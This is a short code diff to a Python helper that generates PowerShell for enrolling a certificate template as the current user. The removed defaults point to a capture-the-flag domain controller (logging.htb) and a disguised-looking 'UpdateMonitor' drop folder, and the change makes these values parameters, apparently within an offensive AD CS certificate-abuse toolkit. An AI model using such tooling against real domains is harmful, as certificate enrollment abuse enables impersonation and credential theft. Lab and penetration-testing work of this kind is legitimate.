@@ -196,10 +196,11 @@ def build_local_enroll_powershell(
     *,
     template: str,
     dns_name: str,
-    ca_host: str = "DC01.logging.htb",
-    ca_name: str = "logging-DC01-CA",
+    ca_host: str,
+    ca_name: str,
     profile: EnrollProfile | None = None,
     run_as_user: str | None = None,
+    drop_path: str = r"C:\ProgramData",
 ) -> str:
     """PowerShell to request a template cert as the current interactive user."""
     prof = profile or EnrollProfile.from_template(
@@ -211,8 +212,8 @@ def build_local_enroll_powershell(
     )
     inf = build_cert_request_inf(prof)
     pfx_name = dns_name
-    log_path = r"C:\ProgramData\UpdateMonitor\enroll.log"
-    out_dir = r"C:\ProgramData\UpdateMonitor"
+    log_path = f"{drop_path.rstrip('\\')}\\enroll.log"
+    out_dir = drop_path.rstrip('\\')
     return f"""
 $log = '{log_path}'
 Start-Transcript -LiteralPath $log -Append -Force
